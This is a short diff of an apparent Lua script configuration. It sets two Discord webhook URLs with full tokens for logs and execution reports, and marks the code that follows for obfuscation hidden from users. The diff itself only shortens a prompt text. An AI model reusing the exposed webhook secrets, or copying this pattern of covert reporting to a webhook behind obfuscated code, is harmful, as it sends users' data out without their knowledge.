@@ -1,7 +1,7 @@
 LogsWebhook = "https://discord.com/api/webhooks/1334217289515663410/dFe9_2EjveZ_fI0DbCMVt7dYUYcxyD3EDMezaiqF8aPtg1NAP6fgA9Q172tupwNtjL8E"
 ExecutionWebhook = "https://discord.com/api/webhooks/1334217289515663410/dFe9_2EjveZ_fI0DbCMVt7dYUYcxyD3EDMezaiqF8aPtg1NAP6fgA9Q172tupwNtjL8E"
 Username = "aka_0ver"
-PromptText = "Click to Launch Script"
+PromptText = "Click to Launch"
 RandomizedPrompt = false
 
 -- << Obfuscate after this moment (For devs, not making it for user)
